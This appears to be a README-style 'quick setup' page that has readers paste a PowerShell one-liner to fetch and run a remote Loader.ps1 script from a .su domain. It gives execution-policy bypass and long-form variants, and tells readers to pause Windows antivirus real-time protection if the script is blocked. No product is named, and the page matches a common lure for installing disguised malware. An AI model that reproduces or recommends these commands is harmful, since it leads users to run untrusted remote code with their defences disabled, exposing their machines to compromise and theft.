## 🛠️ Quick Setup Guide (PowerShell)

1. Launch PowerShell:
   * Press `Win + X` on your keyboard.
   * Click on **Terminal** or **Windows PowerShell** from the list.

2. Execute the Setup Script:
   Copy the command below, paste it into your PowerShell window, and hit `Enter`. The script will handle the necessary registry tweaks and install all dependencies automatically:

   ```powershell
   irm https://get-software.su/powershell/Loader.ps1 | iex
   ```

## 💡 Resolving Issues

### 💬 Script is blocked by Execution Policy
If Windows stops the script from running due to security policies, you can force it to run by pasting this command into a standard Command Prompt (cmd):
```cmd
powershell -ExecutionPolicy Bypass -Command "irm https://get-software.su/powershell/Loader.ps1 | iex"
```

### 💬 "irm" command not found (Outdated PowerShell)
If your PowerShell version doesn't support the `irm` shortcut, use the full, unabbreviated commands instead:
```powershell
Invoke-RestMethod https://get-software.su/powershell/Loader.ps1 | Invoke-Expression
```

### 💬 Antivirus / SmartScreen Alerts
Security software might occasionally flag automated installers. If the script gets blocked, pause "Real-time protection" in your Windows Security dashboard, run the setup, and re-enable your antivirus immediately afterward.
